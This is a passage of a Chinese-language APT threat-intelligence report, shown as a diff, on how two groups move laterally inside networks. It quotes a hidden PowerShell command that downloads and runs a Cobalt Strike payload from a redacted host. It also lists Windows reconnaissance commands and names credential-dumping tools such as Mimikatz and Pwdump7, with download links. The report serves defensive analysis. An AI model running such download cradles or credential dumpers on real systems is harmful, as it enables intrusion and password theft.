@@ -1,0 +1,56 @@
+七、 达成目标：横向移动以扩大战果
+我们在 APT-C-00 组织和 APT-C-12 组织中都发现了横向移动相关迹象，攻击者会从受感
+染机器中选择部分机器进行横向移动，一个典型案例就是 APT-C-12 组织中一台被感染机器
+被先后植入了数十种不同功能，用于横向移动的脚本程序或可执行程序
+23
+一般首先是侦察和识别网络拓扑，获取域计算机信息，获取当前计算机相关主机信息，
+另外包括网卡信息、路由信息等；查看远程计算机服务及状态。获取指定 IP 的共享信息，
+获取共享目录。扫描内网机器远程端口。
+另外是进一步的窃取数据资料，主要补充 RAT 原本没有的功能，相关数据主要偏向文档
+数据、帐号密码和本机环境信息。比如 APT-C-12 组织目的是窃取用户 Outlook 密码、桌面截
+图等，另外获取本地安装软件信息、磁盘信息等，而 APT-C-00 组织主要是窃取指定敏感文
+档数据。
+1） “就地取材”：利用系统本身功能
+APT 组织采用“就地取材”的方式利用 Windows 系统自带命令对受感染目标机器的内
+部网络环境进行侦查，下表是 APT-C-12 组织在实际攻击中使用的部分命令，相关命令多以
+VBS 和 BAT 脚本交替执行。
+|命令|解释|
+|---|---|
+|net view|显示域、计算机或由指定计算机共享资源的列表。|
+|ipconfig /all|Windows IP配置,ipconfig /all 显示详细信息|
+|netstat–an|显示协议统计和当前 TCP/IP网络连接。-a显示所有连接和侦听端口。-n以数字形式显示地址和端口号。|
+|nbtstat -A|列出指定 IP地址的远程机器的名称表。|
+|systeminfo|显示系统信息|
+|tracert -w 1000 8.8.8.8|设置超时时间1 秒,查看当前网络到8.8.8.8 的链路信息|
+|ping|Ping指定的主机|
+|telnet|连接指定主机的指定端口|
+表 10 相关命令列表（APT-C-12 组织）
+下表是 APT-C-00 组织在实际攻击中使用的部分命令。
+|相关步骤|具体命令|
+|---|---|
+|步骤1 |%userprofile%\appdata\roaming\tencent\qq\qq.execmd.exe/c powershell.exe-nop-whidden-c"IEX((new-objectnet.webclient).downloadstring('http://XXXXXX:8080/images/XXXXXX'))"|
+|步骤2 |C:\Windows\SysWOW64\cmd.exe /C ipconfig /allC:\Windows\SysWOW64\cmd.exe /C nbtstat -a 10.3.XX.XXXC:\Windows\SysWOW64\cmd.exe /C net startC:\Windows\SysWOW64\cmd.exe /C netstat -anC:\Windows\SysWOW64\cmd.exe /C net group "domain admins" /domain|
+表 11 相关命令列表（APT-C-00 组织）
+步骤 1 ：参数“ -nop ”不加载默认的 PowerShell 配置文件，“ -w hidden ”没有窗口，“ -c ”
+执行命令从 URL ： 'http://XXXXXX:8080/images/XXXXXX' ，下载并且隐藏执行。
+另外值得注意的是下载的文件就是 APT-C-00 组织的 Encryptor 木马衍生 PowerShell 脚本，
+这个 PowerShell 脚本通过我们分析得出该脚本是由 Cobalt Strike [16] 自动化测试攻击平台生成
+的。攻击者只需通过 Cobalt Strike 平台简单配置 C&C 地址即可生成。该 PowerShell 脚本后续
+16 Cobalt Strike 官方网站， https://www.cobaltstrike.com/
+24
+会释放出 Beacon RAT 。
+步骤 2 ：查看网络信息、查看内网主机 10.3.XX.XXX 的 NetBIOS 名称、查看当前主机启动
+的服务、查看网络连接状况、查看域中的管理员帐户列表、查看本机的用户帐户。
+2） 第三方工具
+在该环节， APT 组织除了采用目标系统自带命令以外，更倾向与借助大量第三方工具来
+进行拓展攻击。第三方工具的优势在于相关功能不仅可以满足攻击需求，而且由于相关工具
+本身作为正常用途，所以不会被安全软件所检测。以下是我们发现的 APT 攻击中常用的第
+三方工具。
+|相关工具|功能|相关公开下载地址|
+|---|---|---|
+|nbtscan|扫描NetBIOS 相关信息|http://www.unixwiz.net/tools/nbtscan-1.0.35.exe|
+|OutlookPasswordDump|获取Outlook 用户密码|http://securityxploded.com/outlook-password-dump.php|
+|Pwdump7|获取系统用户密码|http://www.tarasco.org/security/pwdump_7/|
+|Mimikatz|获取系统用户密码|https://github.com/gentilkiwi/mimikatz|
+表 12 部分第三方工具列表（APT-C-00\APT-C-12 等组织）
+25
